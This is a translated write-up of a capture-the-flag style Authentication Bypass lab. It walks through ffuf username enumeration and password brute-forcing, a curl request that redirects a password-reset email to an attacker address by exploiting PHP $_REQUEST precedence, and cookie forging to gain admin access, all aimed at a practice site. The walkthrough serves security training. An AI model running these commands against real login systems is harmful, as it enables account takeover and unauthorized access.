1. Authentication Bypass

What is Authentication Bypass?

  • Learn how to bypass login and other authentication mechanisms to allow access to unauthorized areas.

Username Enumeration

When searching for authentication vulnerabilities, a useful exercise is to create a list of valid usernames that can be used later for other tasks. For example, on a practice site provided, if you enter the user id admin and fill in the other information with false data, an error message indicating that a user with this username exists will be displayed. Using this, we can verify the validity of usernames against a list of used usernames. In this exercise, we will briefly go through this process using a tool called ffuf.

bash

코드 복사

ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://<IP_ADDRESS>/customers/signup -mr "username already exists"

Just enter this command in the terminal, and it will be completed quickly. To explain the arguments of the command above:

Explanation

  • -w: Selects the file location on your computer that contains the list of usernames to check.
  • -X: Specifies the request method, with GET being the default request.
  • -H: Used to add extra headers to the request.
  • Content-Type: Specifies that form data is being sent to the web server.
  • -u: Specifies the URL to which the request is sent.
  • -mr: The text on the page that indicates whether a valid username has been found.

It can be easily used by installing it on Windows or Linux and using the terminal.

Brute Force

A brute force attack is an automated process where commonly used passwords are tried against a single username or, as in our case, a list of usernames. You can conduct a brute force attack using ffuf, which was installed earlier. The exercise can be completed by entering the commands provided on the page, so I won’t describe it further.

Command Explanation:

bash

코드 복사

ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://<IP_ADDRESS>/customers/login -fc 200

Arguments Explanation

  • W1: Selected a valid username list and W2 a password list to try.
  • Multiple word lists are again specified with the -w argument but separated by a comma.
  • The -fc argument is used to check for an HTTP status code other than 200 for positive matches.

Oh, and this command requires that the verified user information text file from the previous step is already saved. Please keep this in mind.

Logic Flaws

What are logic flaws?

There are cases where the authentication process has logical flaws. A logic flaw occurs when the typical logical path of an application is bypassed, circumvented, or manipulated by a hacker.

Logic Flaw Example

The mock code example below checks whether the client’s path starts with /admin, and if so, further checks if the client is indeed an admin. If the page does not start with /admin, the page is displayed to the client.

php

코드 복사

if( url.substr(0,6) === '/admin') { # Code to check user is an admin } else { # View Page }

Since the PHP code example above uses three equals signs (===), it finds an exact match in the string, including the same case. This code illustrates a logic flaw because an unauthenticated user requesting /admin can view the page without checking their authorization.

Logic Flaw Practical

Practical

Let’s proceed with the exercise. The practice site provided has a password reset function.

Enter the email address provided for testing and then the username, and you will see the following screen.

At this stage, you might wonder what the vulnerability of this application is since you need to know both the email and username, and the password reset link is sent to the account owner’s email address.

In the second step of the reset email process, the username is submitted to the web server in the POST field, and the email address is sent in the GET field from the query string request.

I will explain this by manually creating a request to the web server using the curl tool.

bash

코드 복사

curl 'http://<IP_ADDRESS>/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'

The -H option adds extra headers to the request. In the case of Content-Type, setting it to application/x-www-form-urlencoded tells the web server that form data is being sent, so the request can be understood correctly.

The application uses the query string to look up the user account but later sends the password reset email using the data in the PHP variable within the application logic.

The PHP $_REQUEST variable is an array that includes data received from both the query string and POST data. If the same key name is used in both the query string and POST data, the application logic for this variable will prefer the POST data field over the query string, so you can control where the password reset email is sent by adding another parameter in the POST format.

bash

코드 복사

curl 'http://<IP_ADDRESS>/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'

In the next step, you need to create an account in the Acme IT support customer section. This will provide a unique email address that can be used to create a support ticket. The email address is in the format @customer.acmeitsupport.thm.

Now, if you rerun Curl Request 2 but enter @acmeitsupport.thm in the email field, a ticket with a link to log in as Robert will be generated in the account.

Now, using that, you can log in and solve the problem.

In the command used above, enter the email created in the email part, and after running it, check the Support Tickets for the account you just created, and you’ll find a link to reset Robert’s account password.

After that, by going to that link, you can check the answer in the Support Tickets.

The reason this method is possible is that there is no validation between the user’s name and the email they use.

In other words, it’s a logic flaw.

Identifying these kinds of loopholes and hacking them can be considered an interesting challenge.

Cookie Manipulation

Inspecting and editing cookies set by the web server during an online session can result in various outcomes such as unauthorized access, access to another user’s account, or elevated privileges.

Plain Text

The contents of some cookies might be plain text, and their functionality may be evident. For example, if it's a cookie set after a successful login:

bash

코드 복사

Set-Cookie: logging_in=true; Max-Age=3600; Path=/ Set-Cookie: admin=false; Max-Age=3600; Path=/

Here, one cookie (logged_in) appears to control whether the user is currently logged in, and the other (admin) controls whether the visitor has admin privileges. By changing the contents of these cookies and making a request, you may be able to change your permissions.

bash

코드 복사

curl -H "Cookie: logged_in=true; admin=false" http://<IP_ADDRESS>/cookie-test curl -H "Cookie: logged_in=true; admin=true" http://<IP_ADDRESS>/cookie-test

This command returns different results from before, as both cookies are now set to true.

Hashing

Sometimes cookie values might look like random long strings. These could be hashes, which are irreversible representations of the original text. Here are some examples you might encounter.

Base64 Encoding

At other times, values might look like this:

bash

코드 복사

c2VjcmV0X21lc3NhZ2U=

This is not hashed. It’s encoded using the Base64 encoding method, which is easy to reverse. There are various Base64 decoders available on the internet, including a command-line tool for Linux.

bash

코드 복사

echo "c2VjcmV0X21lc3NhZ2U=" | base64 -d

When the above command is executed, the result will be as follows:

bash

코드 복사

secret_message

Understanding these processes can lead to insights into how cookies can be manipulated.

Weak Session Cookies

There are three properties associated with session cookies: randomness, expiration, and uniqueness.

  • Randomness: A session cookie should be random and non-sequential so that a hacker cannot guess it.
  • Expiration: A session cookie should expire after a certain period, usually after a user logs out, and definitely after a certain amount of time has passed since the last activity.
  • Uniqueness: A session cookie should be unique for each user and session.

Imagine a session cookie like this:

bash

코드 복사

SESSIONID=1

It’s clear that an attacker might try to exploit such a session cookie.

After understanding the structure and properties of session cookies, you can use tools like Burp Suite to analyze and manipulate session cookies.

In Burp Suite, you can intercept requests and manipulate cookies to see how the server responds. This can reveal vulnerabilities such as weak session management or poor cookie handling.
